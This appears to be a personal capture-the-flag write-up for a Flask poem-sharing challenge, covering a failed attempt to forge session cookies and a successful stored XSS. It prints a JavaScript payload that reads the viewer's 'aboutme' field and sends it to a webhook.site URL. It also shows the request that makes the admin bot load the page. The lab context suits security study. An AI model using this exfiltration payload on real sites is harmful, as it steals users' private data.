https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask
- Regarding the provided source code we know, that the admin uses the flag as aboutme description. Keeping this in mind, we need to find a way to authenticate as admin to see the aboutme field or to leak the aboutme data of the admin in another way.
![[Pasted image 20231231010727.png]]
![[Pasted image 20231231010741.png]]

## Using flask-unsign to break the session-cookie and create a new one for admin
- Because we have to deal with a flask application, it can be probably possible to generate own session cookies, for arbitrary users if the secret key of the flask application is not secure. To do so we just need to send any request after the login to get a flask session cookie.
![[Screenshot from 2023-12-31 00-47-47.png]]
- Using the flask-unsign tool we can already see the structure of our flask cookie and which values are contained in it.
![[Pasted image 20231231011226.png]]
-> Secret key is 16 random bytes, so no bruteforce is possible at all. Even if this looks vulnerable at first glance, breaking the cookie generation is impossible.


# XSS (Cross Site Scripting) vulnerability
- Looking at the source code another time, we can see that the poem is rendered using the default render_template method. So our inserted poem behaves like a normal html page. Thus we can inject a html function with inline JavaScript.
![[Pasted image 20231231113812.png]]
#### Testing XSS vulnerability
- To test if the JavaScript is really allowed we just take a random html document with JavaScript inline and post it as a poem.

![[Pasted image 20231231113739.png]]

- Looking at the rendered page, we get the alert box and this ensures, that the JavaScript code is run without any restrictions.
![[Pasted image 20231231114204.png]]
- Now we do have the XSS vulnerability, but it doesn't really help us to authenticate as an admin to see the aboutme field of the admin user account.




# Inserting script into XSS vulnerability
- In this case we just assume, that there will be any option later on to force the admin to our poem site and then steal the flag and we will analyze how this can be done afterwards.
- Inserting this html code into the poem of our user, will end-up redirecting everybody, who tries to see our poem to an webhook-site, which is controlled by us. The webhook side is just used as an controlled website of us in this case, but could also be any self-owned server, which allows us to read the request, which is send after redirection.
- In our JavaScript-Code it is really important that we use the getElementByID() function to read the aboutme value of the requesting user and then send it to our webhook, for example in our case as a url parameter.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect Example</title>
</head>
<body onload="redirectToWebsite()">

    <script>
        function redirectToWebsite() {
            var aboutMeValue = document.getElementById('aboutme').value;
            var redirectUrl = 'https://webhook.site/8a6b57f8-0cb5-42a6-b13d-c8af2e254e42';  
            var finalUrl = redirectUrl + '?flag=' + encodeURIComponent(aboutMeValue);
            
            window.location.href = finalUrl;
        }
    </script>

</body>
</html>

    </body>
</html>
```


# Sending POST request to visit to start worker thread
- After successfully setting up the redirection and the stealing of the aboutme field with the stored html script in our poem property. We need to find a way how to force the admin to visit our side.
- Now coming back to the source code analysis again, we take a look at the visit function at the that exactly this it done. A POST request to /visit end up enqueueing a method called visit_user_page to a worker class. Taking a look at the method visit_url_page, we see that a webdriver is used, which operates under the admin account. 
![[Pasted image 20240108225403.png]]
![[Pasted image 20240108225424.png]]
- So basically everything what, we need to do now after injecting the html, containing our javascript code is calling the visit function.

## Sending POST request to /visit using Burpsuite
- Because it is not possible to call the visit function anymore from our website if we have inserted the script, because it always redirects us to the webhook, we saved one POST request to /visit before, which can be resend now. If this wasn't done, we could still create our own POST request.
```
POST /visit/ HTTP/2
Host: 7301cb0f1403-webth-vulnerable.numa.host
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
Origin: https://7301cb0f1403-webth-vulnerable.numa.host
Alt-Used: 7301cb0f1403-webth-vulnerable.numa.host
Referer: https://7301cb0f1403-webth-vulnerable.numa.host/poem/
Cookie: session=.eJwtjkFqAzEMRa8SvA7FtizZnjP0BiUMtiwloUMC9syihNy9hnb19R-I_15m1a2MmwyzfL3MaZ9hxsEsY5iz-Xxer9JO98fpn-mxbT8f5vK-nOdnl3Ezy94Pme3ezGIc2lxs8aV5UF8qqZNsMWIKKXtNgMWCFu9CjNIwKaCfYRkqoDKICxmsUgYKuUbr0EUJgVOrXEtKCTxTcs1bFuYYgFAat0x53i7G6bweQ_qfzTi6SscJeXRd9-e3PCbmgDQ9AnmybJEiUilQI9GcDzWh88KuNPP-Bc_8U9U.ZZNpnw.WB3jGKNSDpbIpaB7IUMMa8yLJ7A
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

csrf_token=ImM0NTY1YTA0NjI2MGMwNTY3NTZhYTNiNzY2ZTE0NGI4NTEyZWMxYWQi.ZZNpag.yQSFMHTIP4N_Qr9KfivR4oa_zJw
```

- So finally we use Burpsuite to add our poem to the queue, of poems, which should be reviewed. By that we achieve, that the admin is calling our page and so we can steal his aboutme value and redirect it to the webhook, which is done as revealed before in our JavaScript Code.

![[Screenshot from 2024-01-02 02-42-16.png]]
# Checking the webhawk 
- After sending this POST request to /visit we can know check our webhook and see that there was an incoming request, where our provided paramater contains the aboutme value of the admin, which means we finally obtained the flag.

![[Screenshot from 2024-01-02 02-42-36.png]]
